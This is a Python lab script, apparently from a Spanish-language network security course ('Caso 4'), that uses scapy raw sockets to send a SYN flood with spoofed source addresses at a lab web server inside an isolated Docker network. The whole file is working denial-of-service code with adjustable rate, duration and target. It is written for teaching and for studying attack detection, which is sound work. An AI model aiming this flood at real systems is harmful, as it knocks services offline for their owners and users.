#!/usr/bin/env python3
"""case4_synflood_attack.py — genera un SYN flood SINTETICO dentro de la red aislada del laboratorio.

Uso académico (Caso 4). Dirigido EXCLUSIVAMENTE a 172.28.50.20:80, dentro de la red Docker
`internal: true` (sin salida a Internet). Las direcciones de origen usan el bloque RFC 5737
(203.0.113.0/24, reservado para documentación/pruebas), que no es enrutable y no corresponde
a ningún host real: solo sirve para simular varios "atacantes" dentro del mismo laboratorio.

Ejecutar SIEMPRE dentro del contenedor lab-analyst (tiene las capacidades NET_RAW/NET_ADMIN
que requiere un socket crudo). No ejecutar fuera de la red del laboratorio.
"""
import argparse
import random
import time

from scapy.all import IP, TCP, conf


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="172.28.50.20")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--duration", type=float, default=90, help="segundos")
    ap.add_argument("--rate", type=float, default=200, help="paquetes SYN por segundo (aprox.)")
    a = ap.parse_args()

    sock = conf.L3socket()          # un solo socket crudo reutilizado (mucho más rápido que send() por paquete)
    delay = 1.0 / a.rate
    end = time.time() + a.duration
    sent = 0
    try:
        while time.time() < end:
            src = f"203.0.113.{random.randint(2, 254)}"
            sport = random.randint(1024, 65535)
            seq = random.randint(0, 2**32 - 1)
            pkt = IP(src=src, dst=a.target) / TCP(sport=sport, dport=a.port, flags="S", seq=seq)
            sock.send(pkt)
            sent += 1
            time.sleep(delay)
    except KeyboardInterrupt:
        pass
    finally:
        sock.close()
    print(f"Paquetes SYN enviados: {sent} en {a.duration:.0f} s (~{sent / a.duration:.0f} pkt/s)")


if __name__ == "__main__":
    main()
